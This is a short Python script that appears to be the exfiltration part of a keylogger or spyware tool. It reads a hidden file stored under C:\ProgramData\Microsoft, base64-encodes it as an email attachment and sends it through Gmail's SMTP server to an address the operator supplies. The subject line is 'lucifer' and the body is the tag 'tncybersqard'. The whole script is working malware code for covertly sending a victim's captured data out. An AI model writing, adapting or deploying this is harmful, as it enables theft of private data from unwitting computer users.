import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEBase import MIMEBase
from email import encoders
import os
import time



fromaddr = "email here"#add your email address here
toaddr = "email here"#add your email address here


msg = MIMEMultipart()

msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "lucifer"

body = "tncybersqard"

msg.attach(MIMEText(body, 'plain'))

filename = ".rc.txt"
attachment = open("C:\ProgramData\Microsoft\.rc.txt", "rb")

part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

msg.attach(part)

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(fromaddr, "password here")#add your password here between two ""
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text)
server.quit()
